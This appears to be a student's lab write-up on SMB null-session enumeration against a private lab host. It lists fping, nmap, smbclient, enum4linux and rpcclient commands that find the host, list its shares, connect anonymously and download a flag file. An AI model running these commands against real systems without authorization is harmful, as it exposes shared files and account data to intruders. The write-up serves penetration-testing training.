# Null Session 

> Makayla Ferrell | July 28th, 2021

### Steps 


1. Connect to VPN 
```
sudo openvpn <filename> 
```
2. Find Network IP range 
```
ip a 
```
192.168.99.100/24

3. Find active hosts with fping 
```
fping -a -g 192.168.99.100/24 2>/dev/null 
```
The target is 192.168.99.162

4. nmap scan 
```
sudo nmap -sV -O 192.168.99.162     
```
Host is running 135, 139, 445. 

5. Enumerate Shares 
```
smbclient -L //192.168.99.162 -N  
enum4linux -S 192.168.99.162 
nmap --script=smb-enum-shares 192.168.99.162 > nmap_smb.txt
```

6. Check for null session using enum4linux
```
enum4linux -n 192.168.99.162 
```
Null session is allowed 

7. Connect via smbclient 
```
smbclient //192.168.99.162/IPC$ -N
```

8. Find congratulations.txt 
WorkSharing Drive 
```
smbclient //192.168.99.162/WorkSharing -N 
get Congratulations.txt
```

9. Get more out of the null session 
```
rpcclient -N 192.168.99.162 -U ""  
help 
```